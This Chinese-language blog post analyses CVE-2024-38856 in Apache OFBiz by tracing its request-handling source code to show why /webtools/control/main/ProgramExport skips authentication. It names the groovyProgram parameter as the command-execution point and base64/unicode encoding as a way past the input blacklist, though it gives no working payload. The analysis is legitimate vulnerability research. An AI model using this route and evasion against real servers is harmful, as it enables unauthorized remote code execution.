<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="stoocea" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  <meta name="description" content="time thicking away" />
  
  
  
  <title>
    
      CVE-2024-38856 Apache OFBiz18.12.15 任意代码执行漏洞分析 
      
      
      |
    
     stoocea&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.jpeg" alt="">
      
    </a>
    <div class="nickname"><a href="/">stoocea</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">CVE-2024-38856 Apache OFBiz18.12.15 任意代码执行漏洞分析</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2024-08-29 21:00:56
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags mr-10" title="标签"></i>
                
                <span class="span--tag mr-8">
                  <a href="/tags/ofbiz/" title="ofbiz">
                    #ofbiz
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><p>这里我选择的版本是12.8.10版本，也是上一个Groovy表达式注入修复的版本</p>
<p><a target="_blank" rel="noopener" href="https://www.oscs1024.com/hd/MPS-7q8o-01rs">https://www.oscs1024.com/hd/MPS-7q8o-01rs</a></p>
<p>从漏洞描述中挑选出几个关键的点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProgramExport 和 EntitySQLProcessor 模块未对用户身份进行校验</span><br><span class="line">将 payload 通过 base64 和 unicode 编码后绕过 SecuredUpload.isValidText 黑名单校验</span><br><span class="line">通过 /webtools/control/main/ProgramExport 接口传入 groovyProgram 参数远程执行任意系统命令</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h1><h2 id="ControllerServlet"><a href="#ControllerServlet" class="headerlink" title="ControllerServlet"></a>ControllerServlet</h2><p>ofbiz中对于每一次请求的处理都是由一个总的Servlet来进行分发和处理请求的，定位到每一个具有web功能的模块，然后观察它的web.xml配置就能够找到这个servlet</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Main Control Servlet<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ControlServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.ofbiz.webapp.control.ControlServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>具体的内容跟平常的servlet一样，具有doPost和doGet方法用来处理请求，只不过这里POST请求统一封装到了doGet方法中</p>
<p>​<img src="/images/ofbizs1/image-20240818143025-thnvmm8.png" alt="image">​</p>
<p>这里的内容其实没什么好讲的，只需注意对RequestHandler的初始化时，将我们此时请求的路由所对应的controllerxml文件已经封装好了就行。然后验一下每次请求共同的常规设置，针对每一次特定的请求处理还是往下看RequestHandler的内容.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">errorPage</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// the ServerHitBin call for the event is done inside the doRequest method</span></span><br><span class="line">         handler.doRequest(request, response, <span class="literal">null</span>, userLogin, delegator);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (MethodNotAllowedException e) &#123;</span><br><span class="line">         response.setContentType(<span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">         response.setCharacterEncoding(request.getCharacterEncoding());</span><br><span class="line">         response.setStatus(HttpServletResponse.SC_METHOD_NOT_ALLOWED);</span><br><span class="line">         response.getWriter().print(e.getMessage());</span><br><span class="line">         Debug.logError(e.getMessage(), <span class="keyword">module</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="RequestHandler的具体解析"><a href="#RequestHandler的具体解析" class="headerlink" title="RequestHandler的具体解析"></a>RequestHandler的具体解析</h2><p>由于doRequest方法的内容将近500多行，这里肯定不能一次性理清，下面只列出三个部分的关键性代码：<strong>关于影响到我们的payload流入sink点的几个关键点</strong>，<strong>以及是如何根据路由调用到对应模块的功能的</strong>，<strong>最后是鉴权（这一点不会讲太多，因为该漏洞的利用不需要用到之前几个CVE的鉴权流程）</strong> 。</p>
<p>‍</p>
<p>在doRequest方法的最开始，进行了一次对各模块的controller配置的加载。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            ccfg = <span class="keyword">new</span> <span class="title class_">ControllerConfig</span>(getControllerConfig());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (WebAppConfigurationException e) &#123;</span><br><span class="line">            Debug.logError(e, <span class="string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RequestHandlerException</span>(e);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>具体的getControllerConfig如下，此时的<code>controllerConfigURL</code>​值为<code>file:/usr/src/apache-ofbiz/framework/webtools/webapp/webtools/WEB-INF/controller.xml</code>​</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ConfigXMLReader.ControllerConfig <span class="title function_">getControllerConfig</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ConfigXMLReader.getControllerConfig(<span class="built_in">this</span>.controllerConfigURL);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (WebAppConfigurationException e) &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">FIXME:</span> controller.xml errors should throw an exception.</span></span><br><span class="line">        Debug.logError(e, <span class="string">&quot;Exception thrown while parsing controller.xml file: &quot;</span>, <span class="keyword">module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>我们可以定位到webtools的controller.xml内容，代码量有点多，只定位到我们指定的main路由下，这里返回的参数比较重要。一个是security标签，另一个是response标签，返回的内容是success，type为view。这也是我们之后会进入渲染view逻辑的前提。</p>
<p>​<img src="/images/ofbizs1/image-20240815154733-nztavjh.png" alt="image">​</p>
<p>然后在所有的controller.xml文件中，最开头总会include几个用于鉴权的xml内容。在webtools.xml include了这些xml的内容,但是preprocessor的预处理内容只在common-controller中定义了</p>
<p>​<img src="/images/ofbizs1/image-20240815165915-1i2dzux.png" alt="image">​</p>
<p>总计7个要预处理的event，在之后的会有一段for循环将这些event全部遍历一遍进行pre预处理，主要是影响到常规安全检测的过程，不是最主要的。</p>
<p>​<img src="/images/ofbizs1/image-20240815192756-por20io.png" alt="image">​</p>
<p>‍</p>
<h3 id="关键性参数获取"><a href="#关键性参数获取" class="headerlink" title="关键性参数获取"></a>关键性参数获取</h3><p>获取完ControllerConfig之后，开始对URL进行分部解析，这里主要是获取到<code>&quot;webtools&quot;</code>​，<code>&quot;main&quot;</code>​,<code>&quot;ProgramExport&quot;</code>​这三个部分，用来定位到具体的模块和具体的路由功能</p>
<p>细看一下代码中如何根据我们的路由定位到webtools模块的。</p>
<p>通过调用UtilHtpp.getApplicationName方法，截取URL中的第一位数据，截取的规则是<code>/</code>​符号分割。requestUri是截取<code>/</code>​之后的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">cname</span> <span class="operator">=</span> UtilHttp.getApplicationName(request);  <span class="comment">//cname=&quot;webtools&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">defaultRequestUri</span> <span class="operator">=</span> RequestHandler.getRequestUri(request.getPathInfo());</span><br><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getPathInfo(); <span class="comment">//path=&quot;/main/ProgramExport&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">requestUri</span> <span class="operator">=</span> getRequestUri(path); <span class="comment">//requesturi=&quot;main&quot;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">overrideViewUri</span> <span class="operator">=</span> getOverrideViewUri(path); <span class="comment">//overrideViewUri=&quot;ProgramExport&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getApplicationName</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">appName</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (request.getContextPath().length() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            appName = request.getContextPath().substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// When you set a mountpoint which contains a slash inside its name (ie not only a slash as a trailer, which is possible),</span></span><br><span class="line">        <span class="comment">// as it&#x27;s needed with OFBIZ-10765, OFBiz tries to create a cookie with a slash in its name and that&#x27;s impossible.</span></span><br><span class="line">        <span class="keyword">return</span> appName.replaceAll(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>之后根据ControllerConfig以及request封装一个RequestMaps,整个Maps其实就是webtools Controllerxml中的所有路由标签键值对，然后根据我们当次请求的requestUri(也就是”main”)进行匹配，所获取到的包含当前请求requesturi对应的路由标签requestMap。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line">        <span class="type">RequestMap</span> <span class="variable">requestMap</span> <span class="operator">=</span> resolveMethod(method, rmaps).orElseThrow(() -&gt; &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> UtilProperties.getMessage(<span class="string">&quot;WebappUiLabels&quot;</span>, <span class="string">&quot;RequestMethodNotMatchConfig&quot;</span>,</span><br><span class="line">                    UtilMisc.toList(requestUri, method), UtilHttp.getLocale(request));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MethodNotAllowedException</span>(msg);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//最终获取到的map内容如下：</span></span><br><span class="line">    &lt;request-map uri=<span class="string">&quot;main&quot;</span>&gt;</span><br><span class="line">        &lt;security https=<span class="string">&quot;true&quot;</span> auth=<span class="string">&quot;false&quot;</span>/&gt; <span class="comment">//注意这里不需要auth，表明该功能不需要鉴权。</span></span><br><span class="line">        &lt;response name=<span class="string">&quot;success&quot;</span> type=<span class="string">&quot;view&quot;</span> value=<span class="string">&quot;main&quot;</span>/&gt;</span><br><span class="line">    &lt;/request-map&gt;</span><br></pre></td></tr></table></figure>

<p>继续往下走是判断我们是否为chain请求，这里其实不用管，我们进入RequestHandler的时候chain选项就是false，所以不会进入if (chain)的内容，但是其else内容还是要进的。这里的else内容就是我们上面留下的那7个pre Event的执行了，循环遍历,并且一一invoke到具体的代码逻辑，整体对我们漏洞执行无影响，大概就是一些常规的该项目自带的安全前置检测，JWT校验等等</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (ConfigXMLReader.Event event: ccfg.getPreprocessorEventList().values()) &#123;  <span class="comment">//ControllerConfig中的ProcessorEvent的是很多的，但是pre只有那么几个</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">returnString</span> <span class="operator">=</span> <span class="built_in">this</span>.runEvent(request, response, event, <span class="literal">null</span>, <span class="string">&quot;preprocessor&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (returnString == <span class="literal">null</span> || <span class="string">&quot;none&quot;</span>.equalsIgnoreCase(returnString)) &#123;</span><br><span class="line">                        interruptRequest = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="string">&quot;success&quot;</span>.equalsIgnoreCase(returnString)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!returnString.contains(<span class="string">&quot;:_protect_:&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">EventHandlerException</span>(<span class="string">&quot;Pre-Processor event [&quot;</span> + event.invoke + <span class="string">&quot;] did not return &#x27;success&#x27;.&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123; <span class="comment">// protect the view normally rendered and redirect to error response view</span></span><br><span class="line">                            returnString = returnString.replace(<span class="string">&quot;:_protect_:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (returnString.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                request.setAttribute(<span class="string">&quot;_ERROR_MESSAGE_&quot;</span>, returnString);</span><br><span class="line">                            &#125;</span><br><span class="line">                            eventReturn = <span class="literal">null</span>;</span><br><span class="line">                            <span class="comment">// check to see if there is a &quot;protect&quot; response, if so it&#x27;s ok else show the default_error_response_view</span></span><br><span class="line">                            <span class="keyword">if</span> (!requestMap.requestResponseMap.containsKey(<span class="string">&quot;protect&quot;</span>)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (ccfg.getProtectView() != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    overrideViewUri = ccfg.getProtectView();</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    overrideViewUri = EntityUtilProperties.getPropertyValue(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;default.error.response.view&quot;</span>, delegator);</span><br><span class="line">                                    overrideViewUri = overrideViewUri.replace(<span class="string">&quot;view:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="string">&quot;none:&quot;</span>.equals(overrideViewUri)) &#123;</span><br><span class="line">                                        interruptRequest = <span class="literal">true</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (EventHandlerException e) &#123;</span><br><span class="line">                    Debug.logError(e, <span class="keyword">module</span>);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h3 id="鉴权绕过分析"><a href="#鉴权绕过分析" class="headerlink" title="鉴权绕过分析"></a>鉴权绕过分析</h3><p>过完这段else里面的大for之后，比较关键的鉴权逻辑如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//      </span></span><br><span class="line"><span class="keyword">if</span> (requestMap.securityAuth) &#123;</span><br><span class="line">....</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里为什么我折叠了起来呢？不知道是否还记得最开始获取requestMap的时候，我们定位到了main的键值对标签，其中 <security>标签中auth的值为false，对应的就是此时<code>requestMap.securityAuth</code>​为false，也就是我们当前webtools&#x2F;main这个路由是不需要鉴权的，直接润。但是我们最终利用的是<code>ProgramExport</code>​路由的渲染功能，查看一下<code>ProgramExport</code>​在webtools的xml中是如何定义的</security></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;request-map uri=<span class="string">&quot;ProgramExport&quot;</span>&gt;</span><br><span class="line">        &lt;security https=<span class="string">&quot;true&quot;</span> auth=<span class="string">&quot;true&quot;</span>/&gt;</span><br><span class="line">        &lt;response name=<span class="string">&quot;success&quot;</span> type=<span class="string">&quot;view&quot;</span> value=<span class="string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="line">        &lt;response name=<span class="string">&quot;error&quot;</span> type=<span class="string">&quot;view&quot;</span> value=<span class="string">&quot;ProgramExport&quot;</span>/&gt;</span><br><span class="line">    &lt;/request-map&gt;</span><br></pre></td></tr></table></figure>

<p> 可以看到ProgramExport本身是需要鉴权的，也就是auth&#x3D;true。那为什么<code>requestMap.securityAuth</code>​的结果是main路由下的false呢？回到requestMap的获取过程</p>
<p>requestMap是通过requestMaps获取到的,跟进一下requetMaps构造的具体逻辑</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Collection&lt;RequestMap&gt; rmaps = resolveURI(ccfg, request);</span><br></pre></td></tr></table></figure>

<p>​<img src="/images/ofbizs1/image-20240816100055-jf8ecrq.png" alt="image">​</p>
<p>这里最关键的判断是</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (requestMapMap.containsKey(requestUri)</span><br><span class="line">               <span class="comment">// Ensure that overridden view exists.</span></span><br><span class="line">               &amp;&amp; (viewUri == <span class="literal">null</span> || viewMapMap.containsKey(viewUri) </span><br><span class="line">               || (<span class="string">&quot;SOAPService&quot;</span>.equals(requestUri) &amp;&amp; <span class="string">&quot;wsdl&quot;</span>.equalsIgnoreCase(req.getQueryString()))))</span><br></pre></td></tr></table></figure>

<p>requestMapMap封装的是webtools的controllerxml文件中所有的路由映射，这里我们肯定能够匹配到<code>main</code>​下的路由映射。之后试图映射viewMapMap也肯定能够匹配到<code>ProgramExport</code>​。所以这里的if判断肯定是能过的，过了之后就执行了下面的requestMaps的获取,他这里仅仅只是获取路由映射作为requestMaps的结果，这里是很正常的思路，但是到了之后的response返回时，却采取的是viewUri视图映射的逻辑了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmaps = requestMapMap.get(requestUri);</span><br></pre></td></tr></table></figure>

<p>补充了一些鉴权的前置部分，继续往下走逻辑的话，是关于当前requestMap，也就是main路由下的配置检查，如果存在event，则需要定位到相关的event对应类和方法，并且执行逻辑。执行完之后要封装eventReturnResponse。但是main路由下是没有event的，所以这些逻辑是不用走的。</p>
<p>‍</p>
<h3 id="结果渲染"><a href="#结果渲染" class="headerlink" title="结果渲染"></a>结果渲染</h3><p>最后就是将repsonse和其他结果进行渲染返回了。不过还是要判断一下当前request(main路由)的response类型，再做具体的执行逻辑。在main路由中对应的response类型是view</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;response name=<span class="string">&quot;success&quot;</span> type=<span class="string">&quot;view&quot;</span> value=<span class="string">&quot;main&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;url&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">               <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a URL redirect.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">               callRedirect(nextRequestResponse.value, response, request, ccfg.getStatusCodeString());</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;url-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">               <span class="comment">// check for a cross-application redirect</span></span><br><span class="line">               <span class="keyword">if</span> (Debug.verboseOn())</span><br><span class="line">                   Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a URL redirect with redirect parameters.&quot;</span></span><br><span class="line">                           + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">               callRedirect(nextRequestResponse.value + <span class="built_in">this</span>.makeQueryString(request, nextRequestResponse), response,</span><br><span class="line">                       request, ccfg.getStatusCodeString());</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;cross-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">               <span class="comment">// check for a cross-application redirect</span></span><br><span class="line">               <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a Cross-Application redirect.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">               <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> nextRequestResponse.value.startsWith(<span class="string">&quot;/&quot;</span>) ? nextRequestResponse.value : <span class="string">&quot;/&quot;</span> + nextRequestResponse.value;</span><br><span class="line">               callRedirect(url + <span class="built_in">this</span>.makeQueryString(request, nextRequestResponse), response, request, ccfg.getStatusCodeString());</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;request-redirect&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">               <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a Request redirect.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">               callRedirect(makeLinkWithQueryString(request, response, <span class="string">&quot;/&quot;</span> + nextRequestResponse.value, nextRequestResponse), response, request, ccfg.getStatusCodeString());</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;request-redirect-noparam&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">               <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a Request redirect with no parameters.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line">               callRedirect(makeLink(request, response, nextRequestResponse.value), response, request, ccfg.getStatusCodeString());</span><br><span class="line">           &#125; <span class="comment">//前面的if都可以不用看，我们直接来到处理view response的块   </span></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">               <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">               <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">               <span class="type">String</span> <span class="variable">viewName</span> <span class="operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="literal">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line">               renderView(viewName, requestMap.securityExternalView, request, response, saveName);</span><br><span class="line">           &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		..............</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

